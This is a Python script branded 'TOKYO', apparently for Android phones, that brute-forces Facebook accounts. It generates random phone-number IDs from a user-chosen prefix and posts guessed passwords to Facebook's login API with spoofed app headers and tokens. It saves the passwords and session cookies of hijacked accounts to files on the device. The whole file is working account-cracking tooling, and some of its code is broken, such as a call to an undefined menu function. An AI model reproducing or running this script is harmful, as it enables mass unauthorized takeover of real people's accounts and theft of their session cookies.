#▬▭▬▭▬▭▬▭[ IMPORTANT DATA ]▬▭▬▭▬▭▬▭#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess,base64
	from string import *
	import bs4
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\033[1;97m [•] INSTALLING MISSING MODULES ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
except:pass
#▬▭▬▭▬▭▬▭[ SIM-ID ]▬▭▬▭▬▭▬▭#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#▬▭▬▭▬▭▬▭[ LOCAL ]▬▭▬▭▬▭▬▭#
try:
    os.makedirs('/sdcard/TOKYO')
except:
    pass
sys.stdout.write('\x1b]2; ⏤͟͟͞͞ ⍣⃝😈🆃🄾🅺🅈🅾⍣⃝😈 ͟͞⏤ \x07')
version = '52.0'
#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
logo=(f"""
\033[1;97m ████████╗ ██████╗ ██╗  ██╗██╗   ██╗ ██████╗
 ╚══██╔══╝██╔═══██╗██║ ██╔╝╚██╗ ██╔╝██╔═══██╗
    ██║   ██║   ██║█████╔╝  ╚████╔╝ ██║   ██║
    ██║   ██║   ██║██╔═██╗   ╚██╔╝  ██║   ██║
    ██║   ╚██████╔╝██║  ██╗   ██║   ╚██████╔╝
    ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝
 ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭
\033[1;97m [•] AUTHOR     :  URSULA CORBERO
\033[1;97m [•] STATUS     :  PAID
\033[1;97m [•] TOOL       :  FILE CLONING
 ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭
\033[1;92m\t\t VERSION : {version}
\033[1;97m ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭""")
#▬▭▬▭▬▭▬▭[ LINE SETUP ]▬▭▬▭▬▭▬▭#
def linex():
  print('\033[1;97m ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭')
#▬▭▬▭▬▭▬▭[ CLEAR SETUP ]▬▭▬▭▬▭▬▭#
def clear():
  os.system('clear')
  print(logo)
#▬▭▬▭▬▭▬▭[ LOOP SETUP ]▬▭▬▭▬▭▬▭#
loop=0
ok=[]
cp=[]
#▬▭▬▭▬▭▬▭[ USERAGENT SETUP ]▬▭▬▭▬▭▬▭#
def _ua_():
    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/436.0.0.45.111;FBPN/com.facebook.orca;FBLC/fr_GN;FBBV/541554436;FBCR/Orange GN;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2207};FB_FW/1;]"
    return ua
#▬▭▬▭▬▭▬▭[ MAIN MENU ]▬▭▬▭▬▭▬▭#
def Pak():
    clear()
    user=[]
    print('\033[1;97m [•] EXAMPLE  : 0306,0315,0335,0345')
    linex()
    code = input('\033[1;97m [•] PUT CODE : ')
    clear()
    try:
        limit = int(input('\033[1;97m [•] EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;97m ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭\n\033[1;97m [•] PUT LIMIT : '))
    except ValueError:
        limit = 99999
    clear()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as executor:
        clear()
        tl = str(len(user))
        print('\033[1;97m [•] TOTAL UID   : \033[1;92m'+tl+f'')
        print(f'\033[1;97m [•] CHOICE CODE : \033[1;92m'+code)
        print(f'\033[1;97m [•] USE FLIGHT MODE AFTER EVERY 2 MINUTES')
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx,ids,'121472','151214']
            executor.submit(rd1,ids,passlist)
    print('\033[1;97m')
    linex()
    print(f'\033[1;97m [•] THE PROCESS HAS BEEN COMPLETE...')
    print(f'\033[1;97m [•] TOTAL OK : %s' % str(len(ok)))
    print(f'\033[1;97m [•] TOTAL CP : %s' % str(len(cp)))
    linex()
    input(f"\033[1;97m [?] PRESS ENTER TO BACK MENU ")
    Tokyo_Menu()
#▬▭▬▭▬▭▬▭[ R1 ]▬▭▬▭▬▭▬▭#
def rd1(ids, passlist):
    try:
        global loop,ok,cp,sim_id
        sys.stdout.write(f"\r\033[1;97m [RANDOM]-[{loop}]-[OK/CP]-[{len(ok)}/{len(cp)}]")
        for pas in passlist:
            data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'sq_AL',
                    'client_country_code': 'AL',
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
                    'User-Agent': _ua_(),
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': '20000',
                    'X-FB-SIM-HNI': '20000',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Connection-Type': 'WIFI',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookies = f"sb={ssbb};{coki}"
                    req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                    if "Photoshop" in req:
                        print(f"\r\r\033[1;92m [TOKYO-OK] {uid} | {pas} ")
                        os.system('espeak -a 300 " Crack,   Live,   Account,"')
                        open('/sdcard/TOKYO-R-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
                        open('/sdcard/TOKYO-R-OK.txt','a').write(uid+'|'+pas+'\n')
                        ok.append(uid)
                        break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    #print(f"\r\r\033[1;91m [TOKYO-CP] {uid} | {pas} ")
                    open('/sdcard/TOKYO-R-CP.txt','a').write(uid+'|'+pas+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[ THE END ]▬▭▬▭▬▭▬▭#
try:
    Pak()
except requests.exceptions.ConnectionError:
    clear()
    print('\033[1;97m [•] No internet connection ...')
    exit()
except:exit()